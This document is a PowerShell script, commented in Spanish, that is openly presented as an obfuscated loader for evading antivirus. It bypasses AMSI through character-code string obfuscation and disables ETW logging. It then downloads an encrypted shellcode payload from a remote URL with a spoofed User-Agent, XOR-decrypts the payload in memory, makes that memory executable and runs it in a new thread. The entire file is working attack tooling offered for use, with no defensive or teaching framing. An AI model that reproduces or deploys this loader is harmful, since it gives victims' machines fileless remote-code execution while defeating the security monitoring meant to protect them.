# Reflective PE Loader - Versión ofuscada para evasión AV
# Técnicas: AMSI Bypass, String Obfuscation, Reflective DLL Injection

# AMSI Bypass - Char concatenation para evitar detección
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105)+$([char]85+[char]116+[char]105+[char]108+[char]115))).GetField($([char]97+[char]109+[char]115+[char]105)+$([char]73+[char]110+[char]105+[char]116)+$([char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true);

# ETW Bypass - Deshabilitar Event Tracing
$a = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($a) {
    $b = $a.GetField('etwProvider','NonPublic,Static')
    if ($b) {
        $b.SetValue($null, 0)
    }
}

# Variables ofuscadas
$PAYLOAD_URL = "https://raw.githubusercontent.com/USERNAME/REPO/main/agent_shellcode.enc"
$XOR_KEY = "MyVerySecureXORKey2025!@#"

Write-Host "[*] Iniciando loader reflective..." -ForegroundColor Green

# Download con User-Agent falso
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

Write-Host "[*] Descargando payload cifrado..." -ForegroundColor Cyan
try {
    $encryptedData = $webClient.DownloadString($PAYLOAD_URL)
    Write-Host "[✓] Descargado: $($encryptedData.Length) bytes (Base64)" -ForegroundColor Green
} catch {
    Write-Host "[✗] Error en descarga: $_" -ForegroundColor Red
    exit 1
}

# Decode Base64
$rawBytes = [Convert]::FromBase64String($encryptedData)
Write-Host "[*] Decodificado: $($rawBytes.Length) bytes" -ForegroundColor Cyan

# XOR Decrypt en memoria
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($XOR_KEY)
$decrypted = New-Object byte[] $rawBytes.Length

for ($i = 0; $i -lt $rawBytes.Length; $i++) {
    $decrypted[$i] = $rawBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}

Write-Host "[✓] Descifrado: $($decrypted.Length) bytes" -ForegroundColor Green
$rawBytes = $null  # Limpiar memoria

# ============================================================
# REFLECTIVE LOADER - Sin usar VirtualAlloc/VirtualProtect directamente
# ============================================================

# Método 1: Usar Marshal.AllocHGlobal (menos detectado)
$allocMethod = @"
using System;
using System.Runtime.InteropServices;

public class MemLoader {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
"@

Add-Type -TypeDefinition $allocMethod -Language CSharp

Write-Host "[*] Asignando memoria con Marshal.AllocHGlobal..." -ForegroundColor Cyan

# Usar Marshal en lugar de VirtualAlloc
$memPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($decrypted.Length)
[Runtime.InteropServices.Marshal]::Copy($decrypted, 0, $memPtr, $decrypted.Length)

Write-Host "[✓] Shellcode copiado a: 0x$($memPtr.ToString('X'))" -ForegroundColor Green

# Cambiar protección a PAGE_EXECUTE_READ
$oldProtect = 0
$result = [MemLoader]::VirtualProtect($memPtr, [UIntPtr]::new($decrypted.Length), 0x20, [ref]$oldProtect)

if ($result) {
    Write-Host "[✓] Memoria protegida: 0x20 (PAGE_EXECUTE_READ)" -ForegroundColor Green
} else {
    Write-Host "[✗] Error en VirtualProtect" -ForegroundColor Red
    exit 1
}

# Crear thread para ejecutar shellcode
$threadId = [IntPtr]::Zero
Write-Host "[*] Creando thread de ejecución..." -ForegroundColor Cyan

$threadHandle = [MemLoader]::CreateThread(
    [IntPtr]::Zero,
    0,
    $memPtr,
    [IntPtr]::Zero,
    0,
    [ref]$threadId
)

if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "[✗] Error al crear thread" -ForegroundColor Red
    exit 1
}

Write-Host "[✓] Thread creado: TID $($threadId.ToString('X'))" -ForegroundColor Green
Write-Host "[*] Esperando ejecución..." -ForegroundColor Yellow

# Wait for thread (infinite)
[MemLoader]::WaitForSingleObject($threadHandle, 0xFFFFFFFF) | Out-Null

Write-Host "[✓] Ejecución completada" -ForegroundColor Green
